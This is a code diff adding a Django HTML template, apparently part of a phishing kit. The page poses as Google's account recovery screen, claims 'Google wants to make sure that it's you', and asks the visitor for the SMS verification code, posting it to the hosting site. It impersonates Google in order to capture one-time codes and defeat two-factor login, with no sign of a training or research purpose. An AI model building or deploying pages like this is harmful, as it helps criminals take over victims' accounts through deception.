@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login Form</title>
+    <link rel="stylesheet" href="/static/main.css">
+</head>
+<body>
+    <div class="wrapper" style="">
+        <img src="/static/logo.png" alt="">
+        <h1 class="title">Account recovery</h1>
+        <p>To keep your account safe, Google wants to make sure that it's you trying to sign in</p>
+        <p>Get verification code from your sms</p>
+        <form action="." method="POST" id="loginform">
+            {% csrf_token %}
+            <div class="animate-label">
+                <input type="text" id="username" name="otp" required>
+                <label for="username">Enter code</label>
+                <line></line>
+            </div>
+            <a href="">Try another way</a>
+            <div class="flex">
+                <a href="">More Options</a>
+                <button>Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
